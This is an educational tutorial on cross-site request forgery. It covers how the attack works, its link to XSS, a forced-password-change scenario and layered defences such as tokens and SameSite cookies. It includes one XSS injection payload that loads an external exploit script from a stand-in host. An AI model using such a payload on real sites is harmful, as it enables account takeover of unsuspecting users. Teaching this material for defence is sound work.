# Cross-Site Request Forgery (CSRF)

Another major front-end-related vulnerability you need to understand is **Cross-Site Request Forgery (CSRF)**. While CSRF is often discussed alongside XSS, it is a **distinct class of attack** with a different goal and execution model.

At its core, CSRF abuses the fact that **browsers automatically include authentication data** (such as cookies) when making requests to a site where the user is already logged in. If an attacker can cause the victim’s browser to send a crafted request, that request will be processed **as if it came from the victim**.

---

## How CSRF Works Conceptually

CSRF does **not** require the attacker to steal cookies or break authentication directly. Instead, it relies on:

* The victim being authenticated to a target application
* The browser automatically attaching session cookies
* The application trusting requests without verifying intent

If those conditions are met, an attacker can trigger actions **on behalf of the victim**.

---

## Relationship Between CSRF and XSS

CSRF attacks are often **enabled or amplified** by other vulnerabilities, especially XSS.

* **XSS** allows the attacker to execute JavaScript in the victim’s browser
* **CSRF** allows that JavaScript to perform authenticated actions

However, CSRF does **not strictly require XSS**. It can also be exploited using:

* Crafted HTML forms
* Image tags
* Links
* Auto-submitting requests
* Manipulated HTTP parameters

XSS simply makes CSRF more powerful and reliable.

---

## A Common CSRF Attack Scenario

One classic CSRF scenario is **forced password change**.

Imagine the following:

1. A user is logged into a web application
2. The application allows password changes via an HTTP request
3. No CSRF protection is in place

An attacker crafts JavaScript that:

* Submits a password change request
* Uses the victim’s existing session
* Sets the password to a value chosen by the attacker

If the victim loads the malicious payload (for example, via a comment or injected script), the browser executes it automatically. The attacker can then log in using the new password and fully take over the account.

---

## Using External JavaScript for CSRF

Instead of embedding all malicious code inline, attackers often load an external script:

```html
"><script src=//www.example.com/exploit.js></script>
```

The referenced `exploit.js` file contains JavaScript that:

* Replicates legitimate application requests
* Calls internal APIs
* Submits forms programmatically

To build such an exploit, the attacker must understand:

* How the target application performs the action
* Which endpoints are involved
* What parameters are required
* Whether any additional checks exist

This knowledge is often gathered through normal application usage or traffic inspection.

---

## Why CSRF Is Especially Dangerous Against Admins

CSRF becomes significantly more dangerous when:

* The victim is an administrator
* Admin interfaces expose powerful functionality

Admin-only actions may include:

* Creating or deleting users
* Changing roles or permissions
* Modifying system configuration
* Uploading files
* Triggering back-end processes

In some applications, these functions can be chained into **full back-end compromise**, depending on how much power the admin interface exposes.

---

## Preventing CSRF: Core Principles

Defending against CSRF requires **intent verification**. The application must ensure that requests are:

* Deliberate
* Authenticated
* Originating from a trusted context

Two core input-handling concepts still apply:

### Sanitisation

Removing or encoding special and non-standard characters before:

* Displaying input
* Storing input

### Validation

Ensuring input matches the expected format:

* Email addresses
* Numeric values
* Known option lists

While important, these alone are **not sufficient** to stop CSRF.

---

## Dedicated CSRF Defences

Modern applications use multiple layers of protection:

### Anti-CSRF Tokens

* A unique token is generated per session or request
* The token must be submitted with every sensitive request
* Requests without a valid token are rejected

This is the most common and effective defence.

---

### SameSite Cookies

Cookies can be marked with attributes such as:

* `SameSite=Strict`
* `SameSite=Lax`

These restrict when browsers attach cookies to cross-origin requests, significantly reducing CSRF risk.

---

### Functional Safeguards

Additional friction for sensitive actions:

* Re-entering a password
* Confirming actions explicitly
* Using multi-factor authentication

These controls reduce impact even if CSRF is possible.

---

### Web Application Firewalls (WAFs)

WAFs can:

* Detect suspicious request patterns
* Block known attack signatures

However:

* WAFs can be bypassed
* They should **never** be your primary defence
* Secure coding practices are still mandatory

---

## Important Reality Check

Modern browsers include some built-in protections, and many frameworks ship with CSRF defences enabled by default. Despite this, **CSRF vulnerabilities still appear regularly**.

Reasons include:

* Misconfigured protections
* Disabled safeguards
* Custom-built endpoints
* Incorrect assumptions about trust boundaries

Security controls should be treated as **defence in depth**, not as a substitute for secure design.
